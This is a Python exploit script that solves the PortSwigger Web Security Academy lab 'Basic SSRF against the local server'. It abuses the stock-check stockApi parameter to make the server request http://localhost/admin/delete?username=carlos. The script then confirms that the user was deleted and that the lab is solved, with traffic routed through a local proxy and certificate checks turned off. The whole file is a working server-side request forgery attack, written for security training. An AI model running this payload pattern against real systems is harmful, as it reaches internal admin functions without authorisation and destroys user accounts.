# Basic SSRF against the local server

# https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

check_stock_path = '/product/stock'


##########################################################
#	FUNCTIONS
##########################################################

def delete_user(s, url):
	delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
	params = {'stockApi': delete_user_url_ssrf_payload}
	print('[+] Using payload:\t%s' % params)
	r = s.post(url + check_stock_path, data=params)
	print("[+] Sending payload...")
	time.sleep(2)
	if r.status_code == 200:
		print(r.text)

def check_deleted_user(s, url):
	admin_ssrf_payload = 'http://localhost/admin'
	admin_params = {'stockApi': admin_ssrf_payload}
	r = s.post(url + check_stock_path, data=admin_params)
	print("[+] Checking if CARLOS user has been deleted...")
	if 'User deleted successfully' in r.text:
		print("[+] Successfully deleted CARLOS user !")
	else:
		print("[-] Exploit has FAILED to delete carlos user <!>")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Basic SSRF against the local server')
	parser = argparse.ArgumentParser(description="[+] Lab: Basic SSRF against the local server")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("\n[+] Trying to delete Carlos user...")
			delete_user(s, url)
			time.sleep(2)
			check_deleted_user(s, url)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
